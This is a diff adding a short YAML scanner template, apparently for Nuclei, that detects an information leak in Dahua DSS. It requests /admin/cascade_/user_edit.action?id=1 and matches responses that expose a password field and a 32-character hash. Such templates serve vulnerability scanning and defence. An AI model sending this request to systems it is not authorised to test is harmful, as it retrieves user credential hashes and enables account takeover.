@@ -1,0 +1,22 @@
+id: poc-dahua-dss-user-edit-action-information-leak
+info:
+  name: Dahua DSS user_edit.action Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/cascade_/user_edit.action?id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Password"
+          - "Compulsive Info"
+      - type: regex
+        regex:
+          - "[0-9a-z]{32}"
